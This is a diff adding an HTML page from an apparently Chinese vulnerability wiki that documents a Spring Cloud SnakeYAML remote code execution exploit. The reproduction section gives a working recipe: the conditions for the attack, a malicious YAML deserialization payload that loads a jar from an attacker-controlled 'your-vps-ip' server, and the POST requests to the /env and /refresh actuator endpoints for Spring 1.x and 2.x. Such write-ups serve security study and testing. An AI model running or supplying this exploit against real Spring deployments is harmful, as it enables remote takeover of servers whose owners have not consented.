@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Cloud SnakeYAML RCE - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Cloud SnakeYAML RCE", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_3" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        （CVE-2019-3799）Spring Cloud Config Server 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" class="btn btn-xs btn-link">
+        Spring Boot 配置不当而暴露的路由
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-cloud-snakeyaml-rce">Spring Cloud SnakeYAML RCE<a class="headerlink" href="#spring-cloud-snakeyaml-rce" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h4 id="_2">利用条件：<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在
+    <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标依赖的 <code>spring-cloud-starter</code> 版本 \&lt; 1.3.0.RELEASE</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h2 id="_3">二、漏洞影响<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h2 id="_4">三、复现过程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h4 id="_5">漏洞分析：<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<ol>
+<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL
+    地址</li>
+<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
+<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml
+    内容时会完成指定的动作</li>
+<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
+<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory
+    接口的类并实例化</li>
+<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
+</ol>
+<h3 id="_6">漏洞复现<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h5 id="yml-jar">步骤一： 托管 yml 和 jar 文件<a class="headerlink" href="#yml-jar" title="Permanent link">&para;</a></h5>
+<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP
+服务端口（80、443）</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">使用</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">快速开启</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="nx">server</span>
+
+<span class="nx">python2</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="nx">SimpleHTTPServer</span><span class="w"> </span><span class="mi">80</span>
+<span class="nx">python3</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">server</span><span class="w"> </span><span class="mi">80</span>
+</code></pre></div>
+
+<p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p>
+<div class="codehilite"><pre><span></span><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;]
+  ]]
+]
+</code></pre></div>
+
+<p>在网站根目录下放置后缀为 <code>jar</code> 的文件
+<code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 yaml-payload</p>
+<div class="codehilite"><pre><span></span><code><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">artsploit</span><span class="o">/</span><span class="n">yaml</span><span class="o">-</span><span class="n">payload</span>
+</code></pre></div>
+
+<h5 id="springcloudbootstraplocation">步骤二： 设置 spring.cloud.bootstrap.location 属性<a class="headerlink" href="#springcloudbootstraplocation" title="Permanent link">&para;</a></h5>
+<p>spring 1.x</p>
+<div class="codehilite"><pre><span></span><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+</code></pre></div>
+
+<p>spring 2.x</p>
+<div class="codehilite"><pre><span></span><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
+</code></pre></div>
+
+<h5 id="_7">步骤三： 刷新配置<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
+<p>spring 1.x</p>
+<div class="codehilite"><pre><span></span><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre></div>
+
+<p>spring 2.x</p>
+<div class="codehilite"><pre><span></span><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        （CVE-2019-3799）Spring Cloud Config Server 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" class="btn btn-xs btn-link">
+        Spring Boot 配置不当而暴露的路由
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
